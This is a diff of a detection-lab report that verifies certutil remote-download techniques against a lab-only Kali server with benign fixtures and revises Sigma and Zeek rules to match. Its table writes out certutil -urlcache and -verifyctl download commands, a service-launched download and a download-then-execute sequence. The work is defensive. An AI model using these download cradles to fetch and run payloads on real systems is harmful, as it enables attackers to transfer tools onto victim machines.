@@ -1,69 +1,73 @@
 # Certutil remote-download verification
 
-This run verified a signed-binary download cradle for **Ingress Tool Transfer
-(T1105)**. Kali VM 100 served a 3,768-byte, explicitly benign text fixture over
-lab-only HTTP. Windows VM 104 started from `win_verify_baseline`; Defender
-real-time protection was off and Sysmon 15.21 was running with verification
-config SHA-256
-`5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71`.
+Five new, independently rolled-back runs verify the remote-download shapes
+that the prior lab-shaped rule missed: canonical `-urlcache -f` without
+`-split`, `-verifyctl -f`, a `services.exe` parent, Kali-only HTTPS, and an
+inert PE download followed by execution. Every accepted pcap and its Sysmon
+EID 3 attribution passed the post-run lab-scope gate.
 
-The built-in, validly Microsoft-signed `certutil.exe` was invoked from
-`C:\lab` as `NT AUTHORITY\SYSTEM`:
+| Run | Command / action | Network | Files | Registry | Process | Parent-child |
+|---|---|---|---|---|---|---|
+| URL cache, no split | `certutil.exe -urlcache -f http://192.168.1.50:18081/benign-stage.txt C:\lab\urlcache-no-split.txt` | 2 EID 3; 2 Zeek HTTP | destination + INetCache | certutil API state | certutil EID 1 | PowerShell → certutil |
+| Verify CTL | `certutil.exe -verifyctl -f http://192.168.1.50:18081/benign-stage.txt C:\lab\` | 1 EID 3; 1 Zeek HTTP | Cryptnet cache metadata/content | certutil API state | certutil EID 1 | PowerShell → certutil |
+| Service parent | temporary `CertutilLabDownload` service whose ImagePath is the canonical command | 1 EID 3; 2 Zeek HTTP | cache + destination | service key + certutil API state | certutil EID 1 | **services.exe → certutil** |
+| HTTPS | `certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\lab\https-stage.txt` | 2 EID 3; 2 TLS; 1 x509 | cache + destination | trust/API state | certutil EID 1 | PowerShell → certutil |
+| Download→execute | canonical download of `inert-marker.exe`, SHA-256 gate, then execute | 2 EID 3; 2 Zeek HTTP | PE + marker file | certutil API state; PE none | certutil + PE EID 1 | both are ordered PowerShell children |
 
-```text
-certutil.exe -urlcache -split -f http://192.168.1.50:18080/benign-stage.bin C:\lab\downloaded.bin
-```
+The `-verifyctl` run is intentionally nuanced. This Windows build documents
+the second positional argument as a certificate directory, not an output
+file. An initial attempt with a nonexistent file path returned
+`ERROR_FILE_NOT_FOUND` before networking. With existing `C:\lab\`, the HTTP
+retrieval and cache writes occurred; certutil then returned
+`CRYPT_E_ASN1_BADTAG` because the inert text fixture is not a CTL. The process
+and network download form is nevertheless directly observed.
 
-The measured invocation ran from `2026-08-09T23:07:12.2950827Z` through
-`2026-08-09T23:07:12.3573775Z`, returned exit code 0, and produced a 3,768-byte
-file. Its SHA-256 matched the staged source:
-`92EE1BBE6EE3B6CC7CD6ED720B594C6C3394D362838DB8C02C6CA6732E94F86A`.
+The service run created certutil through Service Control Manager. Sysmon
+recorded `ParentImage=C:\Windows\System32\services.exe`, and the download
+completed with the expected hash even though SCM reported that certutil is
+not service-aware after it exited. This evidence contradicts the old
+shell/script-host constraint, so `selection_parent` was removed entirely.
 
-## Observed telemetry
+The 15,360-byte PE was compiled on Kali from `fixtures/inert-marker.c`. Its
+downloaded SHA-256 matched the build hash
+`4C42BCE005BCF18EBFE85229774D7A5221C5C8C30ACE4BFC031B23A47A7357A2`.
+It exited 0 after writing only the expected 38-byte marker. This adds PE
+identity, executable file-delete metadata, process start, and
+download-path→image correlation that the earlier 3,768-byte text fixture
+could not provide. No new standalone Sigma rule was added for the sequence:
+portable Sigma cannot bind a parsed destination token in one command line to
+a later `Image` value, while a generic “user-writable PE executed” rule would
+be a broad hunt that does not characterize certutil. The correlation is
+documented for backends that support field-to-field sequence joins.
 
-| Dimension | Observation |
-|---|---|
-| Process | Sysmon EID 1 recorded `certutil.exe`, `OriginalFileName=CertUtil.exe`, all three download flags, the HTTP URL, SYSTEM integrity, and the built-in binary hash. |
-| Network | Two Sysmon EID 3 TCP connections reached `192.168.1.50:18080`; EID 22 was absent because the command used an IP literal. Zeek decoded two successful GETs for `/benign-stage.bin`, with User-Agents `Microsoft-CryptoAPI/10.0` and `CertUtil URL Agent`. |
-| File | Five certutil-attributed EID 11 events recorded CryptnetUrlCache metadata/content, an INetCache copy, a SHA-1-named `.key` file, and `C:\lab\downloaded.bin`. EID 23 recorded deletion of the transient INetCache copy and its matching SHA-256. |
-| Registry | Fourteen EID 12 and fourteen EID 13 events showed cryptography OID and Internet Settings/cache initialization; no EID 14 appeared. These targets are normal API state and not distinctive enough for a standalone rule. |
-| Parent-child | The EID 1 event linked certutil to `powershell.exe`, which ran the controlled lab wrapper as SYSTEM. |
+## Precision and rule changes
 
-The full-packet pktmon capture covered
-`2026-08-09T23:07:11.4823786Z`–`2026-08-09T23:07:13.7948783Z`. Offline NSM on
-VM 106 analyzed 132 packets with Zeek 8.2.1 and Suricata 7.0.10; Zeek reported
-zero capture loss and hashed both HTTP response bodies to the expected fixture
-SHA-256. Suricata independently decoded both requests and User-Agent values.
-Its alerts were limited to the expected Python SimpleHTTP server banner and
-pktmon checksum/retransmission artifacts.
+The process rule now requires certutil identity plus any one of `urlcache`,
+`verifyctl`, or `URL` (with `windash`) plus `http`; it no longer requires
+`-split`, `-f`, or any parent. The old 0/23,695 measurement belonged to an
+overfit shell-launched, all-three-switch rule and was not evidence of real
+precision. The broadened rule is remeasured on this branch and its provenance
+is recorded in `verification.json`.
 
-## Sigma detections
+The Cryptnet cache-content rule remains a low-level hunt: legitimate certutil
+CRL, CTL, certificate-chain, enrollment, and troubleshooting retrievals can
+all match. The `Microsoft-CryptoAPI/` Zeek rule remains a high-FP, low-level
+hunt because that User-Agent is normal Windows certificate-chain traffic.
 
-| Tier | Logsource | Rule | Role |
-|---|---|---|---|
-| 1 | `windows/process_creation` | `win_process_creation_certutil_remote_download.yml` | Primary: certutil identity, all download flags, HTTP(S) URL, and command/script-interpreter parent context. |
-| 1 | `zeek/http` | `network_zeek_certutil_cryptoapi_user_agent.yml` | Network: GET with a `Microsoft-CryptoAPI/` User-Agent; no lab address or port is embedded. |
-| 1 | `windows/sysmon/file_event` | `win_file_event_certutil_urlcache_content.yml` | Supporting file signal: certutil writes CryptnetUrlCache content. |
+## Safety and excluded attempts
 
-All three rules are behavior-based and experimental. Legitimate certificate,
-CRL, trust-list, enrollment, and troubleshooting activity can use certutil or
-CryptoAPI, so the process rule is the higher-confidence primary and the network
-and file rules are valuable correlation signals.
+Two timing/isolation probes were rejected by `check-lab-scope.py` and are not
+used as verification evidence. Windows background services contacted a public
+DNS resolver and Microsoft/Akamai HTTP(S) endpoints during one longer capture;
+a second short capture contained responder-only packets from pre-existing
+sessions. Certutil itself contacted only Kali, but the mechanical Zeek gate
+correctly blocked both captures. Work stopped and VM 104 was rolled back after
+each. The accepted method cleared the default gateway, reset the adapter,
+removed default routes, waited for quiescence, and only then captured; all five
+accepted reports read `PASS`.
 
-## Evidence handling and cleanup
-
-Only selected telemetry fields and aggregate counts are committed in
-`evidence/`. The raw PCAP, EVTX files, combined event export, and NSM working
-logs remained in a transient directory outside the repository and are not part
-of this change.
-
-After analysis, the Kali HTTP systemd unit was stopped, its dedicated served
-directory was removed, and no listener remained on port 18080. VM 104 was
-stopped, rolled back to `win_verify_baseline`, and restarted. The lab script,
-downloaded file, packet capture, and telemetry directory were absent after
-rollback; Sysmon returned to `Running` with the expected configuration hash and
-Defender real-time protection remained off.
-
-See [LOLBAS Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/),
-[ATT&CK T1105](https://attack.mitre.org/techniques/T1105/), and
-[ATT&CK T1140](https://attack.mitre.org/techniques/T1140/) for related use cases.
+The committed evidence contains selected telemetry fields, hashes, and a
+sanitized Zeek connection log only. Raw PCAP, EVTX, combined exports,
+certificate/key material, and packet content are not committed. Public-domain
+reputation, internet rarity, and real-public-CA TLS signals are out of lab
+scope because payload delivery was required to remain on Kali.
